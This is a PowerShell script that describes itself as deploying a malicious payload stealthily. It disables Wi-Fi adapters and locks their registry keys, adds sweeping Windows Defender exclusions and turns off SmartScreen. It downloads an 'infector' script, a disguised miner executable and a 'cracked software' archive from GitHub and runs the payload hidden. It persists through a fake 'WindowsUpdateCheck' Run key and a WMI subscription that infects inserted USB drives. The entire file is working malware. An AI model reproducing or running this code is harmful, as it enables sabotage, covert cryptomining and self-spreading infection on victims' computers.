# Wait for initial system stabilization
Start-Sleep -Seconds 15

# Requires administrative privileges
# Permanently disables Wi-Fi via registry and deploys malicious payload
# No logging for stealth

# Elevate to admin if not already
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Disable Wi-Fi adapter in registry
$wifiAdapterKey = $null
$networkAdapters = Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}" -ErrorAction SilentlyContinue
$foundWifi = $false
foreach ($adapter in $networkAdapters) {
    $desc = $adapter.GetValue("DriverDesc")
    if ($desc -like "*Wi-Fi*" -or $desc -like "*Wireless*") {
        Set-ItemProperty -Path $adapter.PSPath -Name "Enabled" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $adapter.PSPath -Name "ConfigFlags" -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
        $wifiAdapterKey = $adapter.PSPath
        $foundWifi = $true
    }
}

# Fallback: Disable all network adapters if Wi-Fi not found
if (-not $foundWifi) {
    foreach ($adapter in $networkAdapters) {
        Set-ItemProperty -Path $adapter.PSPath -Name "Enabled" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $adapter.PSPath -Name "ConfigFlags" -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
    }
}

# Disable WLAN AutoConfig service
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc" -Name "Start" -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue

# Restrict permissions on registry keys
if ($wifiAdapterKey) {
    $acl = Get-Acl -Path $wifiAdapterKey -ErrorAction SilentlyContinue
    $acl.SetAccessRuleProtection($true, $false)
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone", "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $wifiAdapterKey -AclObject $acl -ErrorAction SilentlyContinue
}

# Delay before malicious payload
Start-Sleep -Seconds 15

# Define paths and URLs for malicious payload
$monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
$infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/R_Final.exe"
$payloadPath = "C:\Windows\Temp\svchost_update.exe"
$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"

# Wait for Windows Defender
$maxAttempts = 20
$delayBetweenChecks = 5
for ($i = 0; $i -lt $maxAttempts; $i++) {
    $defenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
        break
    }
    Start-Sleep -Seconds $delayBetweenChecks
}

# Add Defender exclusions
$exclusionsPaths = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\svchost_update.exe",
    "C:\Windows\Temp\WindowsServices",
    "C:\Windows\Temp\update_package.zip",
    "C:\ProgramData\WinKit",
    "C:\Windows\Temp\*",
    "C:\ProgramData\Microsoft\Windows\Temp",
    "C:\Users\*\AppData\Local\Temp",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Program Files\McAfee",
    "C:\Program Files\Symantec",
    "C:\Program Files\Kaspersky Lab",
    "C:\Program Files\Avast Software",
    "C:\Program Files\AVG",
    $monitorScriptPath
)
$exclusionsProcesses = @("svchost_update.exe", "ServiceHost.exe", "cmd.exe", "powershell.exe")
$exclusionsExtensions = @("exe", "dll", "bat", "cmd", "ps1", "vbs", "js", "zip")

foreach ($excl in $exclusionsPaths) {
    $currentExclusions = Get-MpPreference -ErrorAction SilentlyContinue
    if (-not ($currentExclusions.ExclusionPath -contains $excl)) {
        Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
    }
}
foreach ($excl in $exclusionsProcesses) {
    $currentExclusions = Get-MpPreference -ErrorAction SilentlyContinue
    if (-not ($currentExclusions.ExclusionProcess -contains $excl)) {
        Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
    }
}
foreach ($excl in $exclusionsExtensions) {
    $currentExclusions = Get-MpPreference -ErrorAction SilentlyContinue
    if (-not ($currentExclusions.ExclusionExtension -contains $excl)) {
        Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
    }
}

# Disable SmartScreen
$smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
$smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -ne "Off") {
    Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction SilentlyContinue
}

# Download files with retry logic
$retryCount = 3

if (-not (Test-Path -Path $monitorScriptPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $infectorUrl -OutFile $monitorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            Unblock-File -Path $monitorScriptPath -ErrorAction SilentlyContinue
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

if (-not (Test-Path -Path $payloadPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            Unblock-File -Path $payloadPath -ErrorAction SilentlyContinue
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

if (-not (Test-Path -Path $crackedSoftwareFolder)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction SilentlyContinue
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

# Execute payload
if (Test-Path -Path $payloadPath) {
    Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction SilentlyContinue
}

# Set persistence via registry Run key
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateCheck"
$command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
$regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
if (-not $regExists -or $regExists.WindowsUpdateCheck -ne $command) {
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction SilentlyContinue
}

# Set up WMI event for USB monitoring
$filterName = "USBInsertionFilter"
$consumerName = "USBMonitorConsumer"
$existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
$existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue
$existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'""" -ErrorAction SilentlyContinue
if (-not ($existingFilter -and $existingConsumer -and $existingBinding)) {
    if ($existingBinding) { $existingBinding | Remove-WmiObject -ErrorAction SilentlyContinue }
    if ($existingFilter) { $existingFilter | Remove-WmiObject -ErrorAction SilentlyContinue }
    if ($existingConsumer) { $existingConsumer | Remove-WmiObject -ErrorAction SilentlyContinue }
    $query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2"
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name = $filterName
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = $query
    } -ErrorAction SilentlyContinue
    $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monitorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name = $consumerName
        CommandLineTemplate = $commandLine
    } -ErrorAction SilentlyContinue
    $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $filter
        Consumer = $consumer
    } -ErrorAction SilentlyContinue
}
